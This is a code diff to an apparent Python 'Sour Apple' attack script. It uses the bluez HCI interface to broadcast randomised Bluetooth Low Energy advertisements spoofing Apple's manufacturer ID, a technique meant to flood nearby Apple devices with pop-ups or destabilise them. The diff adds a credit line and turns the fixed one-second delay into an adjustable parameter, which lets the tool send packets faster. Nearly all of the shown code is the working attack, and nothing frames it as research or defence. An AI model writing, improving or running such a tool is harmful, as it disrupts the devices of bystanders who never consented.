@@ -1,3 +1,4 @@
+# Credits to https://github.com/RapierXbox
 import random
 import bluetooth._bluetooth as bluez
 from time import sleep
@@ -22,7 +23,7 @@ def setup_device(device_id):
     finally:
         hci_sock.close()
 
-def send_packet(sock):
+def send_packet(sock, delay=1):
     types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
     bt_packet = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                  random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
@@ -36,13 +37,7 @@ def send_packet(sock):
     bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)
     cmd_pkt = struct.pack("<B", 0x00)
     bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
-    sleep(1)
-
-
-
-
-
-
+    sleep(delay)
 
 def SourApple(inf):
     print("Sour Apple Attack Initiated...")
